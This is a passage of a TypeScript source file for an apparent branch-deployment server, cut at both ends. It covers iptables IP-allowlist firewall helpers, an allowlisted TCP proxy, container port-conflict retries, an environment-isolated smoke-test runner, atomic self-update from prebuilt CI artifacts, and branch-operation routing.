      if (!Number.isInteger(prefix) || prefix < 0 || prefix > 32) {
        throw new Error(`CIDR 前缀必须在 0-32 之间：${item}`);
      }
      result.push(`${ip}/${prefix}`);
    } else {
      result.push(`${ip}/32`);
    }
  }
  return Array.from(new Set(result));
}

async function ensureDockerNetwork(shell: IShellExecutor, network: string): Promise<void> {
  if (!/^[a-zA-Z0-9][a-zA-Z0-9_.-]{0,127}$/.test(network)) {
    throw new Error(`Docker network 名称非法：${network}`);
  }
  const inspect = await shell.exec(`docker network inspect ${routeShellQuote(network)}`, { timeout: 10_000 });
  if (inspect.exitCode === 0) return;
  const create = await shell.exec(`docker network create ${routeShellQuote(network)}`, { timeout: 15_000 });
  if (create.exitCode !== 0) {
    throw new Error(`创建 Docker 网络 "${network}" 失败：${combinedOutput(create)}`);
  }
}

async function cleanupResourceExternalFirewall(shell: IShellExecutor, chain: string, port?: number): Promise<void> {
  if (!/^[A-Z0-9_]{1,28}$/.test(chain)) return;
  if (port && port >= 1 && port <= 65535) {
    for (let i = 0; i < 8; i += 1) {
      const del = await shell.exec(`iptables -D DOCKER-USER -p tcp -m conntrack --ctorigdstport ${port} -j ${chain}`, { timeout: 5000 });
      if (del.exitCode !== 0) break;
    }
  }
  await shell.exec(`iptables -F ${chain} 2>/dev/null || true`, { timeout: 5000 });
  await shell.exec(`iptables -X ${chain} 2>/dev/null || true`, { timeout: 5000 });
}

async function applyResourceExternalFirewall(
  shell: IShellExecutor,
  chain: string,
  port: number,
  allowlist: string[],
): Promise<{ enforced: boolean; chain?: string }> {
  if (allowlist.length === 0) {
    await cleanupResourceExternalFirewall(shell, chain, port);
    return { enforced: false };
  }
  if (!/^[A-Z0-9_]{1,28}$/.test(chain)) throw new Error(`iptables chain 名称非法：${chain}`);
  const probe = await shell.exec('iptables -L DOCKER-USER -n', { timeout: 5000 });
  if (probe.exitCode !== 0) {
    throw new Error(`IP allowlist 需要主机 iptables DOCKER-USER 链，但当前不可用：${combinedOutput(probe).slice(0, 240)}`);
  }
  await shell.exec(`iptables -N ${chain} 2>/dev/null || true`, { timeout: 5000 });
  await shell.exec(`iptables -F ${chain}`, { timeout: 5000 });
  for (const cidr of allowlist) {
    const add = await shell.exec(`iptables -A ${chain} -s ${cidr} -j ACCEPT`, { timeout: 5000 });
    if (add.exitCode !== 0) {
      throw new Error(`写入 IP allowlist 失败 (${cidr})：${combinedOutput(add).slice(0, 240)}`);
    }
  }
  const drop = await shell.exec(`iptables -A ${chain} -j DROP`, { timeout: 5000 });
  if (drop.exitCode !== 0) {
    throw new Error(`写入 IP allowlist 默认拒绝规则失败：${combinedOutput(drop).slice(0, 240)}`);
  }
  const check = await shell.exec(`iptables -C DOCKER-USER -p tcp -m conntrack --ctorigdstport ${port} -j ${chain}`, { timeout: 5000 });
  if (check.exitCode !== 0) {
    const jump = await shell.exec(`iptables -I DOCKER-USER 1 -p tcp -m conntrack --ctorigdstport ${port} -j ${chain}`, { timeout: 5000 });
    if (jump.exitCode !== 0) {
      throw new Error(`挂载 IP allowlist 链失败：${combinedOutput(jump).slice(0, 240)}`);
    }
  }
  return { enforced: true, chain };
}

const RESOURCE_TCP_PROXY_SCRIPT = `
const net = require('net');
const targetHost = process.env.TARGET_HOST;
const targetPort = Number(process.env.TARGET_PORT || 0);
const listenPort = Number(process.env.LISTEN_PORT || 15432);
const allowlist = (process.env.ALLOWLIST || '').split(',').map((x) => x.trim()).filter(Boolean);
const block = new net.BlockList();
if (allowlist.length === 0) {
  throw new Error('ALLOWLIST is required for CDS resource TCP proxy');
}
for (const rule of allowlist) {
  const [ip, prefixRaw] = rule.split('/');
  const prefix = Number(prefixRaw || '32');
  if (Number.isInteger(prefix) && prefix >= 0 && prefix <= 32) block.addSubnet(ip, prefix, 'ipv4');
}
function normalizeIp(ip) {
  return String(ip || '').replace(/^::ffff:/, '');
}
const server = net.createServer((client) => {
  const ip = normalizeIp(client.remoteAddress);
  if (!block.check(ip, 'ipv4')) {
    client.destroy();
    return;
  }
  const upstream = net.connect({ host: targetHost, port: targetPort });
  upstream.on('error', () => client.destroy());
  client.on('error', () => upstream.destroy());
  client.pipe(upstream);
  upstream.pipe(client);
});
server.listen(listenPort, '0.0.0.0');
process.on('SIGTERM', () => server.close(() => process.exit(0)));
process.on('SIGINT', () => server.close(() => process.exit(0)));
`;

function resourceTcpProxyImage(): string {
  const image = process.env.CDS_RESOURCE_TCP_PROXY_IMAGE || 'node:20-alpine';
  if (!/^[a-zA-Z0-9][a-zA-Z0-9._/:@-]{0,180}$/.test(image)) {
    throw new Error(`资源 TCP proxy 镜像名非法：${image}`);
  }
  return image;
}

interface RunServiceWithPortRetryOptions {
  stateService: StateService;
  shell: IShellExecutor;
  config: CdsConfig;
  containerService: ContainerService;
  serverEventLogStore?: ServerEventLogSink | null;
  entry: BranchEntry;
  profile: BuildProfile;
  service: ServiceState;
  customEnv?: Record<string, string>;
  requestId?: string | null;
  operationId?: string | null;
  actor?: string | null;
  trigger?: string | null;
  assertCurrent?: (step: string) => void;
  onOutput?: (chunk: string) => void;
  onPortChanged?: (info: { oldPort: number; newPort: number; attempt: number }) => void;
}

async function runServiceWithPortRetry(options: RunServiceWithPortRetryOptions): Promise<void> {
  const maxAttempts = 4;
  for (let attempt = 1; attempt <= maxAttempts; attempt++) {
    try {
      options.assertCurrent?.(`before-run-${options.profile.id}`);
      await options.containerService.runService(
        options.entry,
        options.profile,
        options.service,
        options.onOutput,
        options.customEnv,
        {
          requestId: options.requestId ?? null,
          operationId: options.operationId ?? null,
          actor: options.actor ?? null,
          trigger: options.trigger ?? null,
          assertCurrent: options.assertCurrent,
        },
      );
      return;
    } catch (err) {
      if (!isPortConflictError(err) || attempt === maxAttempts) throw err;
      const oldPort = options.service.hostPort;
      const listeningPorts = await collectListeningPorts(options.shell);
      listeningPorts.add(oldPort);
      const newPort = options.stateService.allocatePort(options.config.portStart, listeningPorts);
      options.service.hostPort = newPort;
      options.service.errorMessage = undefined;
      options.stateService.save();
      options.serverEventLogStore?.record({
        category: 'container',
        severity: 'warn',
        source: 'port-allocator',
        action: 'app.port-conflict.reallocated',
        message: `host port ${oldPort} was occupied; retrying ${options.service.containerName} on ${newPort}`,
        projectId: options.entry.projectId,
        branchId: options.entry.id,
        profileId: options.profile.id,
        containerName: options.service.containerName,
        details: {
          oldPort,
          newPort,
          attempt,
          reason: 'docker-run-port-conflict',
        },
      });
      options.onPortChanged?.({ oldPort, newPort, attempt });
    }
  }
}

/**
 * Result of a single smoke-all.sh run — surface area shared between the
 * manual `/api/branches/:id/smoke` endpoint (Phase 3) and the auto-hook
 * triggered after a successful `/deploy` when `project.autoSmokeEnabled`
 * is true (Phase 4).
 */
export interface SmokeRunResult {
  exitCode: number | null;
  elapsedSec: number;
  passedCount: number;
  failedCount: number;
}

export interface SmokeRunOptions {
  branch: BranchEntry;
  previewHost: string;        // e.g. "https://my-branch.miduo.org"
  accessKey: string;           // resolved AI_ACCESS_KEY
  impersonateUser?: string;    // default 'admin'
  skip?: string;               // comma-separated smoke keys to skip
  failFast?: boolean;
  scriptDir: string;           // dir containing smoke-all.sh
  /** Per-line callback; receives the raw stdout/stderr line. */
  onLine?: (stream: 'stdout' | 'stderr', line: string) => void;
  /** Fires when the bash process exits or errors before exit. */
  onComplete?: (result: SmokeRunResult) => void;
  /** Fires when spawn itself fails (ENOENT, EACCES, etc). */
  onError?: (err: Error) => void;
}

/**
 * Spawn scripts/smoke-all.sh as a child process and fan out its output
 * via callbacks. Callers own the IO side (SSE, check-run update, etc.);
 * this helper just wraps the child-process bookkeeping + pass/fail
 * tally extraction so we don't copy-paste 60 lines of spawn boilerplate.
 *
 * Does NOT validate inputs — callers must have verified that smoke-all.sh
 * exists, that the branch has a preview URL, and that accessKey is
 * non-empty. This is a pure execution helper; validation belongs at the
 * HTTP boundary.
 *
 * Env isolation：历史上这里写的是 `env: { ...process.env, ... }`，等于
 * 把 CDS 进程的所有环境变量（含 CDS_GITHUB_APP_PRIVATE_KEY、
 * CDS_JWT_SECRET、CDS_BOOTSTRAP_TOKEN 等敏感值）整体透传给冒烟脚本。
 * 现改为 shell 必需变量 + SMOKE_* 显式参数 + AI_ACCESS_KEY 的白名单。
 * 冒烟脚本只需要这一小撮，其他一律隔离。
 */
export function runSmokeForBranch(opts: SmokeRunOptions): void {
  const smokeEntry = path.join(opts.scriptDir, 'smoke-all.sh');
  const child = spawn('bash', [smokeEntry], {
    cwd: opts.scriptDir,
    env: buildSmokeEnv({
      previewHost: opts.previewHost,
      accessKey: opts.accessKey,
      impersonateUser: opts.impersonateUser,
      skip: opts.skip,
      failFast: opts.failFast,
    }),
  });
  const startedAt = Date.now();
  let passed = 0;
  let failed = 0;

  const forward = (stream: NodeJS.ReadableStream, channel: 'stdout' | 'stderr') => {
    let buffer = '';
    stream.on('data', (chunk: Buffer) => {
      buffer += chunk.toString('utf8');
      let idx: number;
      while ((idx = buffer.indexOf('\n')) >= 0) {
        const line = buffer.slice(0, idx);
        buffer = buffer.slice(idx + 1);
        // Tally from the "OK 通过: N 项" / "FAIL 失败: N 项" footer lines
        // printed by smoke-all.sh. Not rely on exit code alone — the
        // footer is what CI / UI surface.
        if (line.startsWith('OK 通过:')) {
          const m = /通过:\s*(\d+)/.exec(line);
          if (m) passed = parseInt(m[1], 10);
        } else if (line.startsWith('FAIL 失败:')) {
          const m = /失败:\s*(\d+)/.exec(line);
          if (m) failed = parseInt(m[1], 10);
        }
        opts.onLine?.(channel, line);
      }
    });
  };
  forward(child.stdout!, 'stdout');
  forward(child.stderr!, 'stderr');

  child.on('error', (err) => {
    opts.onError?.(err);
  });

  child.on('close', (code) => {
    opts.onComplete?.({
      exitCode: code,
      elapsedSec: Math.round((Date.now() - startedAt) / 1000),
      passedCount: passed,
      failedCount: failed,
    });
  });
}

/**
 * Locate the smoke-all.sh script. Shared between the manual endpoint
 * and the auto-hook. Returns null when the script is missing so the
 * caller can decide between 500 error (manual endpoint) or warning
 * SSE line (auto-hook, best-effort).
 */
export function resolveSmokeScriptDir(): { dir: string; entry: string; exists: boolean } {
  const dir = process.env.CDS_SMOKE_SCRIPT_DIR
    || path.join(process.cwd(), 'scripts');
  const entry = path.join(dir, 'smoke-all.sh');
  return { dir, entry, exists: fs.existsSync(entry) };
}

export interface RouterDeps {
  stateService: StateService;
  worktreeService: WorktreeService;
  containerService: ContainerService;
  shell: IShellExecutor;
  config: CdsConfig;
  /** Optional warm-pool scheduler (v3.1). When absent, scheduler API returns disabled. */
  schedulerService?: SchedulerService;
  /** Optional global expiry janitor. */
  janitorService?: JanitorService;
  /**
   * Cluster executor registry (scheduler/standalone mode). When absent or
   * containing only an embedded master, deploys run locally. When a remote
   * executor is registered and the request either targets it explicitly or
   * lets the dispatcher pick, the deploy is proxied to the remote executor's
   * `/exec/deploy` HTTP SSE endpoint.
   */
  registry?: ExecutorRegistry;
  /**
   * Current scheduling strategy, read fresh on every dispatch so the
   * Dashboard's strategy radio takes effect immediately without restart.
   * Defaults to `least-load` if not provided.
   */
  getClusterStrategy?: () => 'least-branches' | 'least-load' | 'round-robin';
  /**
   * Optional GitHubAppClient — when provided, deploys post "CDS Deploy"
   * check runs back to GitHub so the PR's Checks panel mirrors CDS's
   * build status. Absent when CDS_GITHUB_APP_* env vars aren't set.
   */
  githubApp?: GitHubAppClient;
  /** Persistent diagnostics sink for container/docker lifecycle and log captures. */
  serverEventLogStore?: ServerEventLogSink | null;
  /** Serializes/fences branch container lifecycle writes. */
  branchOperationCoordinator?: BranchOperationCoordinator;
}

export function shouldSkipFencedDeployCleanupForNewerRuntime(
  entry: Pick<BranchEntry, 'lastReadyAt' | 'lastDeployAt' | 'lastStoppedAt'>,
  operationStartedAt?: string | null,
): boolean {
  const operationMs = operationStartedAt ? Date.parse(operationStartedAt) : NaN;
  if (!Number.isFinite(operationMs)) return false;

  const readyMs = entry.lastReadyAt ? Date.parse(entry.lastReadyAt) : NaN;
  const deployMs = entry.lastDeployAt ? Date.parse(entry.lastDeployAt) : NaN;
  const latestRuntimeMs = Math.max(
    Number.isFinite(readyMs) ? readyMs : 0,
    Number.isFinite(deployMs) ? deployMs : 0,
  );
  if (latestRuntimeMs <= operationMs) return false;

  const stoppedMs = entry.lastStoppedAt ? Date.parse(entry.lastStoppedAt) : NaN;
  return !Number.isFinite(stoppedMs) || stoppedMs < latestRuntimeMs;
}

/**
 * R2 竞态根治（2026-06-24）：会「产出/管理容器」的操作种类。被抢占的部署做
 * fenced cleanup 删容器前，若分支上有这类**更新的**操作在跑，必须跳过删除 ——
 * 那个操作正用/即将重建这些容器，删了会导致紧随其后的 restart/auto-wake 撞
 * `No such container`（服务 0/N）。它们的 runService 按容器名 `docker rm -f`+create
 * 幂等，留着不会泄漏。
 */
export const FENCED_CLEANUP_RUNTIME_PRODUCING_KINDS: ReadonlySet<BranchOperationKind> = new Set<BranchOperationKind>([
  'deploy',
  'deploy-profile',
  'force-rebuild',
  'restart',
  'auto-restart',
  'auto-lifecycle-redeploy',
]);

/** 纯函数：在活跃操作里找出「会接管容器」的非己方操作（用于 fenced cleanup 跳过判定）。可单测。 */
export function findFencedCleanupRuntimeOwner(
  activeOps: ReadonlyArray<{ operationId: string; cancelled?: boolean; request: { kind: BranchOperationKind; source?: string | null } }>,
  selfOperationId: string | null | undefined,
): { operationId: string; kind: BranchOperationKind; source: string | null } | null {
  for (const op of activeOps) {
    if (op.operationId === selfOperationId) continue;
    // Codex P2「Ignore older cancelled operations during fenced cleanup」：被取代但尚未
    // 收尾的操作仍可能挂在 active 列表里且 cancelled=true。它**不会**接管容器，若把它当
    // owner 会误跳过清理、把失败容器留下。已取消的操作一律不算 runtime owner。
    if (op.cancelled) continue;
    if (FENCED_CLEANUP_RUNTIME_PRODUCING_KINDS.has(op.request.kind)) {
      return { operationId: op.operationId, kind: op.request.kind, source: op.request.source ?? null };
    }
  }
  return null;
}

export function parseGitHubRepoFullName(raw: string | null | undefined): string | null {
  const value = String(raw || '').trim();
  if (!value) return null;
  const normalized = value.replace(/[?#].*$/, '').replace(/\.git$/i, '').replace(/\/+$/g, '');
  const direct = normalized.match(/^([A-Za-z0-9._-]+\/[A-Za-z0-9._-]+)$/);
  if (direct) return direct[1];
  const ssh = normalized.match(/github\.com[:/]([A-Za-z0-9._-]+\/[A-Za-z0-9._-]+)$/i);
  if (ssh) return ssh[1];
  try {
    const parsed = new URL(normalized);
    const host = parsed.hostname.toLowerCase();
    if (host !== 'github.com' && !parsed.pathname.includes('/git/')) return null;
    const pathName = parsed.pathname.replace(/^\/+|\/+$/g, '').replace(/\.git$/i, '');
    const http = pathName.match(/^(?:git\/)?([A-Za-z0-9._-]+\/[A-Za-z0-9._-]+)$/);
    if (http) return http[1];
  } catch {
    /* tolerate non-URL git remotes */
  }
  return null;
}

async function resolveSelfUpdatePrebuiltRepoFullName(shell: IShellExecutor, repoRoot: string): Promise<string | null> {
  const explicit =
    parseGitHubRepoFullName(process.env.CDS_SELFUPDATE_PREBUILT_REPO) ||
    parseGitHubRepoFullName(process.env.GITHUB_REPOSITORY);
  if (explicit) return explicit;
  try {
    const remote = (await shell.exec('git remote get-url origin', { cwd: repoRoot, timeout: 5_000 })).stdout.trim();
    return parseGitHubRepoFullName(remote);
  } catch {
    return null;
  }
}

function selfUpdatePrebuiltEnabled(): boolean {
  const raw = String(process.env.CDS_SELFUPDATE_PREBUILT || '').trim().toLowerCase();
  return !['0', 'false', 'off', 'no'].includes(raw);
}

export function replaceDirectoriesAtomically(pairs: Array<{ currentPath: string; nextPath: string }>): void {
  const stamp = Date.now();
  const backups = pairs.map((pair, idx) => ({
    ...pair,
    backupPath: `${pair.currentPath}.old.${stamp}.${idx}`,
    hadCurrent: fs.existsSync(pair.currentPath),
  }));
  try {
    for (const pair of backups) {
      if (pair.hadCurrent) fs.renameSync(pair.currentPath, pair.backupPath);
    }
    for (const pair of backups) {
      fs.renameSync(pair.nextPath, pair.currentPath);
    }
    for (const pair of backups) {
      if (pair.hadCurrent) fs.rmSync(pair.backupPath, { recursive: true, force: true });
    }
  } catch (err) {
    for (const pair of backups) {
      try {
        if (fs.existsSync(pair.currentPath)) fs.rmSync(pair.currentPath, { recursive: true, force: true });
        if (pair.hadCurrent && fs.existsSync(pair.backupPath)) fs.renameSync(pair.backupPath, pair.currentPath);
      } catch {
        /* best-effort rollback */
      }
    }
    throw err;
  }
}

async function tryApplyCdsPrebuiltForSelfUpdate(input: {
  shell: IShellExecutor;
  repoRoot: string;
  targetFullSha: string;
  send: (step: string, status: string, title: string) => void;
}): Promise<{ applied: boolean; reason?: string }> {
  const { shell, repoRoot, targetFullSha, send } = input;
  const repoFullName = await resolveSelfUpdatePrebuiltRepoFullName(shell, repoRoot);
  const decision = shouldTryCdsPrebuilt({
    enabled: selfUpdatePrebuiltEnabled(),
    repoFullName,
    sha: targetFullSha,
    registry: process.env.CDS_SELFUPDATE_PREBUILT_REGISTRY || 'ghcr.io',
  });
  if (!decision.use) {
    return { applied: false, reason: repoFullName ? 'prebuilt disabled or target sha invalid' : 'github repo unresolved' };
  }

  const cdsDir = path.join(repoRoot, 'cds');
  const stagingRoot = path.join(cdsDir, '.cds', `prebuilt-self-update-${Date.now()}`);
  send('prebuilt', 'running', `正在拉取 CI 预构建产物 ${decision.imageRef}`);
  const fetched = await fetchCdsPrebuilt(
    {
      exec: (cmd, opts) => shell.exec(cmd, { cwd: repoRoot, timeout: opts?.timeout }),
      readManifest: async (manifestPath) => {
        try {
          return fs.existsSync(manifestPath) ? fs.readFileSync(manifestPath, 'utf8') : null;
        } catch {
          return null;
        }
      },
      rmrf: (p) => fs.rmSync(p, { recursive: true, force: true }),
      mkdirp: (p) => fs.mkdirSync(p, { recursive: true }),
    },
    decision.imageRef,
    targetFullSha,
    stagingRoot,
    { pullTimeoutMs: 45_000 },
  );
  if (!fetched.ok || !fetched.distDir || !fetched.webDistDir) {
    try { fs.rmSync(stagingRoot, { recursive: true, force: true }); } catch { /* ignore */ }
    return { applied: false, reason: fetched.reason || 'prebuilt fetch failed' };
  }

  const distEntry = path.join(fetched.distDir, 'index.js');
  const webEntry = path.join(fetched.webDistDir, 'index.html');
  if (!fs.existsSync(distEntry) || !fs.existsSync(webEntry)) {
    try { fs.rmSync(stagingRoot, { recursive: true, force: true }); } catch { /* ignore */ }
    return { applied: false, reason: 'prebuilt artifact missing dist/index.js or web-dist/index.html' };
  }

  try {
    replaceDirectoriesAtomically([
      { currentPath: path.join(cdsDir, 'dist'), nextPath: fetched.distDir },
      { currentPath: path.join(cdsDir, 'web', 'dist'), nextPath: fetched.webDistDir },
    ]);
    try { fs.writeFileSync(path.join(cdsDir, 'dist', '.build-sha'), `${targetFullSha}\n`); } catch { /* ignore */ }
    try { fs.writeFileSync(path.join(cdsDir, 'web', 'dist', '.build-sha'), `${targetFullSha}\n`); } catch { /* ignore */ }
    send('prebuilt', 'done', `已应用 CI 预构建产物 ${targetFullSha.slice(0, 8)},跳过本机编译`);
    return { applied: true };
  } catch (err) {
    return { applied: false, reason: `prebuilt atomic replace failed: ${(err as Error).message}` };
  } finally {
    try { fs.rmSync(stagingRoot, { recursive: true, force: true }); } catch { /* ignore */ }
  }
}

export function createBranchRouter(deps: RouterDeps): Router {
  const {
    stateService,
    worktreeService,
    containerService,
    shell,
    config,
    schedulerService,
    janitorService,
    registry,
    getClusterStrategy,
    githubApp,
    serverEventLogStore,
    branchOperationCoordinator,
  } = deps;

  const router = Router();

  async function flushSelfUpdateStateBeforeRestart(context: {
    trigger: 'manual' | 'force-sync';
    branch?: string;
    fromSha?: string;
    toSha?: string;
    actor?: string;
  }): Promise<void> {
    const result = await waitForFlushWithTimeout(
      () => stateService.flush(),
      SELF_UPDATE_STATE_FLUSH_TIMEOUT_MS,
      (err) => {
        serverEventLogStore?.record({
          category: 'system',
          severity: 'error',
          source: 'self-update',
          action: 'self-update.state-flush-failed',
          message: `self-update state flush failed before restart: ${(err as Error).message}`,
          details: {
            ...context,
            timeoutMs: SELF_UPDATE_STATE_FLUSH_TIMEOUT_MS,
          },
          error: { message: (err as Error).message },
        });
      },
    );

    if (result === 'timeout') {
      serverEventLogStore?.record({
        category: 'system',
        severity: 'warn',
        source: 'self-update',
        action: 'self-update.state-flush-timeout',
        message: 'self-update state flush timed out before restart; continuing restart to avoid stale daemon',
        details: {
          ...context,
          timeoutMs: SELF_UPDATE_STATE_FLUSH_TIMEOUT_MS,
        },
      });
    }
  }

  // PR_C.3: AI agent / cookie 真人 / 内部组件 三档解析。本地别名指向
  // services/actor-resolver.ts 的共享实现（Bugbot Low review：原本
  // bridge.ts 和这里各有一份一模一样的实现，新增 header 时容易漏一处）。
  const resolveActorForActivity = resolveActorFromRequest;

  const checkRunRunner = new CheckRunRunner({
    stateService,
    githubApp,
    config,
  });

  function projectIdForDockerNetwork(network?: string | null): string | null {
    if (!network) return null;
    return stateService.getProjects().find((project) => project.dockerNetwork === network)?.id || null;
  }

  function triggerFromRequest(req: Request): BranchOperationTrigger {
    const raw = typeof req.headers['x-cds-trigger'] === 'string' ? req.headers['x-cds-trigger'] : '';
    if (raw === 'webhook') return 'webhook';
    if (raw === 'auto-lifecycle') return 'auto-lifecycle';
    if (raw === 'scheduler') return 'scheduler';
    if (raw === 'janitor') return 'janitor';
    if (raw === 'system') return 'system';
    return 'manual';
  }

  function stopAttributionFromRequest(req: Request): {
    reason: string;
    source: NonNullable<BranchEntry['lastStopSource']>;
    archiveSource: ContainerLogArchiveEntry['source'];
    archiveMessage: string;
  } {
    const trigger = triggerFromRequest(req);
    const actor = resolveActorFromRequest(req);
    if (trigger === 'webhook') {
      return {
        reason: 'GitHub webhook 触发停止',
        source: 'webhook',
        archiveSource: 'webhook-stop',
        archiveMessage: 'captured after webhook stop preserved containers',
      };
    }
    if (actor === 'ai' || actor.startsWith('ai:')) {
      return {
        reason: 'AI Agent 调用停止',
        source: 'ai',
        archiveSource: 'ai-stop',
        archiveMessage: 'captured after ai stop preserved containers',
      };
    }
    if (trigger === 'scheduler') {
      return {
        reason: '调度器触发停止',
        source: 'scheduler',
        archiveSource: 'scheduler-stop',
        archiveMessage: 'captured after scheduler stop preserved containers',
      };
    }
    if (trigger === 'auto-lifecycle') {
      return {
        reason: 'CDS 生命周期策略触发停止',
        source: 'cds',
        archiveSource: 'auto-lifecycle-stop',
        archiveMessage: 'captured after auto lifecycle stop preserved containers',
      };
    }
    if (trigger === 'janitor' || trigger === 'system') {
      return {
        reason: trigger === 'janitor' ? 'Janitor 过期清理触发停止' : '系统触发停止',
        source: 'system',
        archiveSource: 'system-stop',
        archiveMessage: 'captured after system stop preserved containers',
      };
    }
    return {
      reason: '用户手动停止',
      source: 'user',
      archiveSource: 'manual-stop',
      archiveMessage: 'captured after user stop preserved containers',
    };
  }

  function beginBranchOperation(
    req: Request,
    res: Response,
    entry: BranchEntry,
    input: {
      kind: BranchOperationKind;
      profileId?: string | null;
      commitSha?: string | null;
      source: string;
      reason?: string | null;
      sse?: boolean;
      continueWith?: 'deploy' | 'deploy-profile' | null;
    },
  ): BranchOperationLease | null {
    if (!branchOperationCoordinator) return null;
    const requestId = String((req as any).cdsRequestId || req.headers['x-cds-request-id'] || '').trim() || undefined;
    const decision = branchOperationCoordinator.begin({
      branchId: entry.id,
      projectId: entry.projectId,
      profileId: input.profileId || null,
      kind: input.kind,
      trigger: triggerFromRequest(req),
      actor: resolveActorFromRequest(req),
      requestId: requestId || null,
      commitSha: input.commitSha || null,
      source: input.source,
      reason: input.reason || null,
      continueWith: input.continueWith || null,
    });
    if (decision.status === 'started') return decision.lease || null;

    const payload = {
      ok: true,
      operationStatus: decision.status,
      operationId: decision.operationId,
      activeOperationId: decision.activeOperationId,
      activeKind: decision.activeKind,
      pendingCommitSha: decision.pendingCommitSha,
      message: decision.status === 'merged'
        ? '已有同分支部署正在运行，本次 webhook 已合并为最新待部署 commit'
        : decision.reason || '同分支已有写操作正在运行',
    };
    if (input.sse) {
      initSSE(res);
      sendSSE(res, decision.status === 'merged' ? 'complete' : 'error', payload);
      res.end();
    } else if (decision.status === 'merged') {
      res.status(202).json(payload);
    } else {
      res.status(409).json({ ...payload, ok: false });
    }
    return null;
  }

  function beginSilentBranchOperation(
    req: Request,
    entry: BranchEntry,
    input: {
      kind: BranchOperationKind;
      profileId?: string | null;
      commitSha?: string | null;
      source: string;
      reason?: string | null;
      triggerOverride?: BranchOperationTrigger;
      actorOverride?: string | null;
      continueWith?: 'deploy' | 'deploy-profile' | null;
    },
  ): BranchOperationLease | null {
    if (!branchOperationCoordinator) return null;
    const requestId = String((req as any).cdsRequestId || req.headers['x-cds-request-id'] || '').trim() || undefined;
    const decision = branchOperationCoordinator.begin({
      branchId: entry.id,
      projectId: entry.projectId,
      profileId: input.profileId || null,
      kind: input.kind,
      trigger: input.triggerOverride || triggerFromRequest(req),
      actor: input.actorOverride || resolveActorFromRequest(req),
      requestId: requestId || null,
      commitSha: input.commitSha || null,
      source: input.source,
      reason: input.reason || null,
      continueWith: input.continueWith || null,
    });
    return decision.status === 'started' ? decision.lease || null : null;
  }

  function beginAdHocBranchOperation(
    req: Request,
    input: {
      branchId: string;
      projectId?: string | null;
      kind: BranchOperationKind;
      profileId?: string | null;
      commitSha?: string | null;
      source: string;
      reason?: string | null;
      triggerOverride?: BranchOperationTrigger;
      actorOverride?: string | null;
    },
  ): BranchOperationDecision | null {
    if (!branchOperationCoordinator) return null;
    const requestId = String((req as any).cdsRequestId || req.headers['x-cds-request-id'] || '').trim() || undefined;
    return branchOperationCoordinator.begin({
      branchId: input.branchId,
      projectId: input.projectId || null,
      profileId: input.profileId || null,
      kind: input.kind,
      trigger: input.triggerOverride || triggerFromRequest(req),
      actor: input.actorOverride || resolveActorFromRequest(req),
      requestId: requestId || null,
      commitSha: input.commitSha || null,
      source: input.source,
      reason: input.reason || null,
    });
  }

  function dispatchPendingWebhookDeploy(pending: PendingWebhookDeploy | null): void {
    if (!pending) return;
    const branch = stateService.getBranch(pending.branchId);
    if (!branch) {
      serverEventLogStore?.record({
        category: 'system',
        severity: 'warn',
        source: 'branch-operation-coordinator',
        action: 'branch.operation.pending-drop',
        message: `pending webhook deploy dropped because branch is gone: ${pending.branchId}`,
        branchId: pending.branchId,
        requestId: pending.request.requestId || null,
        operationId: pending.operationId,
        operationKind: pending.request.kind,
        operationTrigger: pending.request.trigger,
        operationActor: pending.request.actor || null,
        operationSource: pending.request.source || null,
        commitSha: pending.request.commitSha || null,
        details: {
          operationId: pending.operationId,
          commitSha: pending.request.commitSha || null,
          trigger: pending.request.trigger,
          actor: pending.request.actor || null,
          source: pending.request.source || null,
          kind: pending.request.kind,
          mergedCount: pending.mergedCount,
        },
      });
      return;
    }
    const url = `http://127.0.0.1:${config.masterPort}/api/branches/${encodeURIComponent(pending.branchId)}/deploy`;
    void fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-CDS-Internal': '1',
        'X-CDS-Trigger': 'webhook',
        'X-CDS-Request-Id': pending.request.requestId || pending.operationId,
        ...(branch.projectId ? { 'X-CDS-Source-Project-Id': branch.projectId } : {}),
        'X-CDS-Source-Branch-Id': pending.branchId,
      },
      body: JSON.stringify({ commitSha: pending.request.commitSha || undefined }),
    }).then((response) => {
      if (!response.ok) {
        return response.text().then((body) => {
          throw new Error(`HTTP ${response.status}: ${body.slice(0, 200)}`);
        });
      }
      const reader = response.body?.getReader();
      if (reader) {
        void (async () => {
          try {
            for (;;) {
              const { done } = await reader.read();
              if (done) break;
            }
          } catch { /* ignore drain errors */ }
        })();
      }
    }).catch((err) => {
      serverEventLogStore?.record({
        category: 'system',
        severity: 'error',
        source: 'branch-operation-coordinator',
        action: 'branch.operation.pending-dispatch.failed',
        message: `pending webhook deploy dispatch failed: ${(err as Error).message}`,
        projectId: branch.projectId,
        branchId: pending.branchId,
        requestId: pending.request.requestId || null,
        operationId: pending.operationId,
        operationKind: pending.request.kind,
        operationTrigger: pending.request.trigger,
        operationActor: pending.request.actor || null,
        operationSource: pending.request.source || null,
        commitSha: pending.request.commitSha || null,
        details: {
          operationId: pending.operationId,
          commitSha: pending.request.commitSha || null,
          trigger: pending.request.trigger,
          actor: pending.request.actor || null,
          source: pending.request.source || null,
          kind: pending.request.kind,
          mergedCount: pending.mergedCount,
        },
      });
    });
    serverEventLogStore?.record({
      category: 'system',
      severity: 'info',
      source: 'branch-operation-coordinator',
      action: 'branch.operation.pending-dispatch.started',
      message: `pending webhook deploy dispatched: ${pending.branchId}`,
      projectId: branch.projectId,
      branchId: pending.branchId,
      requestId: pending.request.requestId || null,
      operationId: pending.operationId,
      operationKind: pending.request.kind,
      operationTrigger: pending.request.trigger,
      operationActor: pending.request.actor || null,
      operationSource: pending.request.source || null,
      commitSha: pending.request.commitSha || null,
      details: {
        operationId: pending.operationId,
        commitSha: pending.request.commitSha || null,
        trigger: pending.request.trigger,
        actor: pending.request.actor || null,
        source: pending.request.source || null,
        kind: pending.request.kind,
        mergedCount: pending.mergedCount,
      },
    });
  }

  function completeBranchOperation(
    lease: BranchOperationLease | null | undefined,
    status: 'completed' | 'failed' | 'cancelled',
    error?: string,
  ): void {
    if (!lease || !branchOperationCoordinator) return;
    const pending = branchOperationCoordinator.complete(lease, status, error);
    dispatchPendingWebhookDeploy(pending);
  }

  function assertBranchOperationCurrent(lease: BranchOperationLease | null | undefined, step: string): void {
    lease?.assertCurrent(step);
  }

  async function waitForRestartSafeBranchOperationsForRoute(
    source: string,
    // 默认 timeout=0: self-update 不再为 in-flight branch operation 等 180s。
    // 需要强一致排空时由请求显式传 drain=true 或 drainTimeoutMs。
    timeoutMs: number,
    intervalMs = 1000,
  ) {
